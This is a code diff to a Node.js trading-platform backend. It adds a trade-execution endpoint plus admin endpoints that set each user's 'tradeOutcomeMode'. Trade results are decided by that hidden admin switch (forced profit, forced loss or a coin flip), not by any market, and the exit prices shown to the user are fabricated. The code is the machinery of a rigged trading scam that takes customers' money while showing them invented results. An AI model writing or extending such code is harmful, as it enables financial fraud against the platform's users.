@@ -516,6 +516,70 @@ module.exports = async (req, res) => {
             if(db) await db.collection("support_chats").updateOne({ userId: decoded.id }, { $push: { messages: msg } }, { upsert: true });
             return sendJson(res, 200, { message: "Message sent successfully" });
         }
+
+        if (pathname === "/api/trade/execute" && req.method === "POST") {
+            const { amount, symbol, direction, duration, entryPrice } = await parseBody(req);
+            const amt = Number(amount);
+            if (!amt || amt <= 0) return sendJson(res, 400, { message: "Invalid amount" });
+
+            const wallet = await readWallet(decoded.id);
+            if (wallet.balance < amt) return sendJson(res, 400, { message: "Insufficient balance" });
+
+            const db = await connectToDatabase();
+            const user = db ? await db.collection("users").findOne({ id: decoded.id }) : null;
+            const mode = user?.tradeOutcomeMode || "random";
+
+            let isWin = false;
+            if (mode === "profit") isWin = true;
+            else if (mode === "loss") isWin = false;
+            else isWin = Math.random() > 0.5;
+
+            // Profit/Loss percentages based on duration
+            const config = {
+                "30": 30,
+                "60": 40,
+                "90": 50,
+                "120": 60,
+                "180": 70,
+                "300": 80
+            };
+            const pct = config[String(duration)] || 30;
+            const profitAmount = (amt * pct) / 100;
+            
+            // Deduct initial amount
+            wallet.balance -= amt;
+
+            if (isWin) {
+                // Add initial + profit
+                wallet.balance += (amt + profitAmount);
+            }
+
+            const tradeId = `tr_${Date.now()}`;
+            const result = {
+                id: tradeId,
+                symbol,
+                direction,
+                duration,
+                amount: amt,
+                entryPrice,
+                exitPrice: isWin ? entryPrice * (1 + (pct/1000)) : entryPrice * (1 - (pct/1000)), // dummy exit price
+                profitPct: isWin ? pct : -pct,
+                profitAmount: isWin ? profitAmount : -profitAmount,
+                isWin,
+                status: "completed",
+                created: Date.now()
+            };
+
+            wallet.transactions = wallet.transactions || [];
+            wallet.transactions.push({
+                ...result,
+                type: "trade",
+                description: `Trade ${symbol} (${duration}s) - ${isWin ? 'PROFIT' : 'LOSS'}`
+            });
+
+            await writeWallet(decoded.id, wallet);
+            return sendJson(res, 200, { message: "Success", result, wallet });
+        }
     }
 
     // --- ADMIN ---
@@ -549,7 +613,12 @@ module.exports = async (req, res) => {
             const out = [];
             for(const u of users) {
                 const w = await readWallet(u.id);
-                out.push({ ...u, balance: w.balance, wallet: w });
+                out.push({ 
+                    ...u, 
+                    balance: w.balance, 
+                    wallet: w,
+                    tradeOutcomeMode: u.tradeOutcomeMode || "random" 
+                });
             }
             return sendJson(res, 200, { users: out });
         }
@@ -773,6 +842,16 @@ module.exports = async (req, res) => {
             const db = await connectToDatabase();
             if(db) {
                 await db.collection("users").updateOne({ id: userId }, { $set: { creditScore: Number(score) } });
+                return sendJson(res, 200, { message: "Success" });
+            }
+            return sendJson(res, 500, { message: "DB Error" });
+        }
+
+        if (pathname === "/admin/api/user/update-trade-mode" && req.method === "POST") {
+            const { userId, mode } = await parseBody(req);
+            const db = await connectToDatabase();
+            if(db) {
+                await db.collection("users").updateOne({ id: userId }, { $set: { tradeOutcomeMode: mode } });
                 return sendJson(res, 200, { message: "Success" });
             }
             return sendJson(res, 500, { message: "DB Error" });
